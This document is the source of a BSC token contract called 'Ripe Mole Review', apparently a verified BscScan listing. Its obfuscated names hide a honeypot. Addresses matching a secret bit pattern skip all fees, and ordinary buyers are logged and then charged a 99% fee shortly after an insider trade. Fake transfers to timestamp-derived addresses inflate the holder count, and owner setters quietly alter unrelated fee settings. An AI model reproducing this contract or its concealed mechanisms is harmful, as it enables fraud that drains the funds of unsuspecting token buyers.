/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract RipeMoleReview is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Ripe Mole Review ";
    string constant _symbol = "RipeMoleReview";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletSwapTxMax;
    mapping(address => bool) private marketingBotsIsSell;
    mapping(address => bool) private buyAutoLiquidityLimit;
    mapping(address => bool) private launchedTradingAutoSell;
    mapping(address => uint256) private exemptReceiverBotsWalletTeam;
    mapping(uint256 => address) private isWalletMaxLimit;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private marketingWalletExemptSwap = 0;
    uint256 private isTeamLimitSwapBuyMaxBurn = 9;

    //SELL FEES
    uint256 private autoTeamLaunchedMin = 0;
    uint256 private tradingModeLaunchedBuyTeam = 9;

    uint256 private limitFeeTxMinBurnExempt = isTeamLimitSwapBuyMaxBurn + marketingWalletExemptSwap;
    uint256 private minExemptLaunchedModeSellWalletAuto = 100;

    address private autoIsReceiverSwapBuy = (msg.sender); // auto-liq address
    address private launchedLiquidityAutoMin = (0x558ab928c13977b895F2eEDefFffF1e4D53181AF); // marketing address
    address private isMinFeeMax = DEAD;
    address private modeTeamReceiverExempt = DEAD;
    address private teamLaunchedIsLimit = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private sellBotsIsMin;
    uint256 private burnMarketingTxBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private isBurnBuySwap;
    uint256 private teamExemptSwapMin;
    uint256 private minSwapTradingLimitSellBotsBurn;
    uint256 private txMinMarketingExempt;
    uint256 private launchedTeamFeeWallet;

    bool private botsLiquidityTeamSell = true;
    bool private launchedTradingAutoSellMode = true;
    bool private receiverLimitMaxBots = true;
    bool private tradingMinFeeTx = true;
    bool private liquidityLimitBurnBotsMarketingWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private walletTradingMinSellModeAuto = _totalSupply / 1000; // 0.1%

    
    uint256 private exemptMaxFeeMode = 0;
    uint256 private modeSwapMarketingMax = 0;
    uint256 private maxExemptLaunchedSell = 0;
    uint256 private tradingLaunchedReceiverSwap = 0;
    bool private liquidityMaxBurnSell = false;
    uint256 private marketingSellModeExempt = 0;
    bool private modeLaunchedExemptIsWalletSellMax = false;
    bool private maxWalletMarketingAuto = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        isBurnBuySwap = true;

        walletSwapTxMax[msg.sender] = true;
        walletSwapTxMax[address(this)] = true;

        marketingBotsIsSell[msg.sender] = true;
        marketingBotsIsSell[0x0000000000000000000000000000000000000000] = true;
        marketingBotsIsSell[0x000000000000000000000000000000000000dEaD] = true;
        marketingBotsIsSell[address(this)] = true;

        buyAutoLiquidityLimit[msg.sender] = true;
        buyAutoLiquidityLimit[0x0000000000000000000000000000000000000000] = true;
        buyAutoLiquidityLimit[0x000000000000000000000000000000000000dEaD] = true;
        buyAutoLiquidityLimit[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitModeSellBurn(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitModeSellBurn(sender, recipient, amount);
    }

    function limitModeSellBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (modeLaunchedExemptIsWalletSellMax != tradingMinFeeTx) {
            modeLaunchedExemptIsWalletSellMax = botsLiquidityTeamSell;
        }


        bool bLimitTxWalletValue = receiverTeamAutoSellFeeBuyLaunched(sender) || receiverTeamAutoSellFeeBuyLaunched(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                modeWalletMarketingIs();
            }
            if (!bLimitTxWalletValue) {
                minTradingExemptBurn(recipient);
            }
        }
        
        if (tradingLaunchedReceiverSwap != minExemptLaunchedModeSellWalletAuto) {
            tradingLaunchedReceiverSwap = modeSwapMarketingMax;
        }

        if (maxExemptLaunchedSell != marketingSellModeExempt) {
            maxExemptLaunchedSell = isTeamLimitSwapBuyMaxBurn;
        }

        if (modeSwapMarketingMax == exemptMaxFeeMode) {
            modeSwapMarketingMax = autoTeamLaunchedMin;
        }


        if (inSwap || bLimitTxWalletValue) {return swapIsBurnTxLiquidityReceiverMax(sender, recipient, amount);}

        if (!walletSwapTxMax[sender] && !walletSwapTxMax[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (exemptMaxFeeMode != marketingWalletExemptSwap) {
            exemptMaxFeeMode = minExemptLaunchedModeSellWalletAuto;
        }

        if (liquidityMaxBurnSell != maxWalletMarketingAuto) {
            liquidityMaxBurnSell = maxWalletMarketingAuto;
        }

        if (maxExemptLaunchedSell != isTeamLimitSwapBuyMaxBurn) {
            maxExemptLaunchedSell = modeSwapMarketingMax;
        }


        require((amount <= _maxTxAmount) || buyAutoLiquidityLimit[sender] || buyAutoLiquidityLimit[recipient], "Max TX Limit has been triggered");

        if (feeBotsIsSell()) {isMarketingSellLimitWalletLiquidity();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (modeSwapMarketingMax == tradingModeLaunchedBuyTeam) {
            modeSwapMarketingMax = marketingSellModeExempt;
        }

        if (maxWalletMarketingAuto != liquidityLimitBurnBotsMarketingWallet) {
            maxWalletMarketingAuto = launchedTradingAutoSellMode;
        }


        uint256 amountReceived = isMinMarketingTeamTx(sender) ? limitMinTxFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function swapIsBurnTxLiquidityReceiverMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isMinMarketingTeamTx(address sender) internal view returns (bool) {
        return !marketingBotsIsSell[sender];
    }

    function maxModeBuySell(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            limitFeeTxMinBurnExempt = tradingModeLaunchedBuyTeam + autoTeamLaunchedMin;
            return receiverTeamTradingBuy(sender, limitFeeTxMinBurnExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitFeeTxMinBurnExempt = isTeamLimitSwapBuyMaxBurn + marketingWalletExemptSwap;
            return limitFeeTxMinBurnExempt;
        }
        return receiverTeamTradingBuy(sender, limitFeeTxMinBurnExempt);
    }

    function limitMinTxFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(maxModeBuySell(sender, receiver == uniswapV2Pair)).div(minExemptLaunchedModeSellWalletAuto);

        if (launchedTradingAutoSell[sender] || launchedTradingAutoSell[receiver]) {
            feeAmount = amount.mul(99).div(minExemptLaunchedModeSellWalletAuto);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 3; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function receiverTeamAutoSellFeeBuyLaunched(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function receiverTeamTradingBuy(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = exemptReceiverBotsWalletTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function minTradingExemptBurn(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        isWalletMaxLimit[exemptLimitValue] = addr;
    }

    function modeWalletMarketingIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (exemptReceiverBotsWalletTeam[isWalletMaxLimit[i]] == 0) {
                    exemptReceiverBotsWalletTeam[isWalletMaxLimit[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(launchedLiquidityAutoMin).transfer(amountBNB * amountPercentage / 100);
    }

    function feeBotsIsSell() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    liquidityLimitBurnBotsMarketingWallet &&
    _balances[address(this)] >= walletTradingMinSellModeAuto;
    }

    function isMarketingSellLimitWalletLiquidity() internal swapping {
        
        if (marketingSellModeExempt != marketingWalletExemptSwap) {
            marketingSellModeExempt = maxExemptLaunchedSell;
        }


        uint256 amountToLiquify = walletTradingMinSellModeAuto.mul(marketingWalletExemptSwap).div(limitFeeTxMinBurnExempt).div(2);
        uint256 amountToSwap = walletTradingMinSellModeAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (marketingSellModeExempt == exemptMaxFeeMode) {
            marketingSellModeExempt = tradingLaunchedReceiverSwap;
        }

        if (modeSwapMarketingMax != tradingLaunchedReceiverSwap) {
            modeSwapMarketingMax = marketingWalletExemptSwap;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitFeeTxMinBurnExempt.sub(marketingWalletExemptSwap.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingWalletExemptSwap).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isTeamLimitSwapBuyMaxBurn).div(totalETHFee);
        
        payable(launchedLiquidityAutoMin).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoIsReceiverSwapBuy,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMarketingBotsIsSell(address a0) public view returns (bool) {
        if (a0 != launchedLiquidityAutoMin) {
            return maxWalletMarketingAuto;
        }
        if (a0 != modeTeamReceiverExempt) {
            return modeLaunchedExemptIsWalletSellMax;
        }
            return marketingBotsIsSell[a0];
    }
    function setMarketingBotsIsSell(address a0,bool a1) public onlyOwner {
        marketingBotsIsSell[a0]=a1;
    }

    function getBuyAutoLiquidityLimit(address a0) public view returns (bool) {
            return buyAutoLiquidityLimit[a0];
    }
    function setBuyAutoLiquidityLimit(address a0,bool a1) public onlyOwner {
        if (a0 == modeTeamReceiverExempt) {
            botsLiquidityTeamSell=a1;
        }
        if (buyAutoLiquidityLimit[a0] != walletSwapTxMax[a0]) {
           walletSwapTxMax[a0]=a1;
        }
        buyAutoLiquidityLimit[a0]=a1;
    }

    function getMarketingWalletExemptSwap() public view returns (uint256) {
        return marketingWalletExemptSwap;
    }
    function setMarketingWalletExemptSwap(uint256 a0) public onlyOwner {
        if (marketingWalletExemptSwap != minExemptLaunchedModeSellWalletAuto) {
            minExemptLaunchedModeSellWalletAuto=a0;
        }
        if (marketingWalletExemptSwap != tradingModeLaunchedBuyTeam) {
            tradingModeLaunchedBuyTeam=a0;
        }
        if (marketingWalletExemptSwap == exemptMaxFeeMode) {
            exemptMaxFeeMode=a0;
        }
        marketingWalletExemptSwap=a0;
    }

    function getMinExemptLaunchedModeSellWalletAuto() public view returns (uint256) {
        if (minExemptLaunchedModeSellWalletAuto == isTeamLimitSwapBuyMaxBurn) {
            return isTeamLimitSwapBuyMaxBurn;
        }
        if (minExemptLaunchedModeSellWalletAuto == maxExemptLaunchedSell) {
            return maxExemptLaunchedSell;
        }
        if (minExemptLaunchedModeSellWalletAuto == marketingSellModeExempt) {
            return marketingSellModeExempt;
        }
        return minExemptLaunchedModeSellWalletAuto;
    }
    function setMinExemptLaunchedModeSellWalletAuto(uint256 a0) public onlyOwner {
        minExemptLaunchedModeSellWalletAuto=a0;
    }

    function getWalletSwapTxMax(address a0) public view returns (bool) {
            return walletSwapTxMax[a0];
    }
    function setWalletSwapTxMax(address a0,bool a1) public onlyOwner {
        if (a0 != teamLaunchedIsLimit) {
            maxWalletMarketingAuto=a1;
        }
        walletSwapTxMax[a0]=a1;
    }

    function getIsWalletMaxLimit(uint256 a0) public view returns (address) {
        if (a0 != maxExemptLaunchedSell) {
            return launchedLiquidityAutoMin;
        }
            return isWalletMaxLimit[a0];
    }
    function setIsWalletMaxLimit(uint256 a0,address a1) public onlyOwner {
        isWalletMaxLimit[a0]=a1;
    }

    function getLimitFeeTxMinBurnExempt() public view returns (uint256) {
        if (limitFeeTxMinBurnExempt == maxExemptLaunchedSell) {
            return maxExemptLaunchedSell;
        }
        return limitFeeTxMinBurnExempt;
    }
    function setLimitFeeTxMinBurnExempt(uint256 a0) public onlyOwner {
        if (limitFeeTxMinBurnExempt == isTeamLimitSwapBuyMaxBurn) {
            isTeamLimitSwapBuyMaxBurn=a0;
        }
        if (limitFeeTxMinBurnExempt == exemptMaxFeeMode) {
            exemptMaxFeeMode=a0;
        }
        limitFeeTxMinBurnExempt=a0;
    }

    function getLaunchedLiquidityAutoMin() public view returns (address) {
        if (launchedLiquidityAutoMin != modeTeamReceiverExempt) {
            return modeTeamReceiverExempt;
        }
        return launchedLiquidityAutoMin;
    }
    function setLaunchedLiquidityAutoMin(address a0) public onlyOwner {
        if (launchedLiquidityAutoMin == autoIsReceiverSwapBuy) {
            autoIsReceiverSwapBuy=a0;
        }
        launchedLiquidityAutoMin=a0;
    }

    function getTradingLaunchedReceiverSwap() public view returns (uint256) {
        if (tradingLaunchedReceiverSwap == exemptMaxFeeMode) {
            return exemptMaxFeeMode;
        }
        return tradingLaunchedReceiverSwap;
    }
    function setTradingLaunchedReceiverSwap(uint256 a0) public onlyOwner {
        if (tradingLaunchedReceiverSwap == tradingLaunchedReceiverSwap) {
            tradingLaunchedReceiverSwap=a0;
        }
        if (tradingLaunchedReceiverSwap != tradingModeLaunchedBuyTeam) {
            tradingModeLaunchedBuyTeam=a0;
        }
        tradingLaunchedReceiverSwap=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}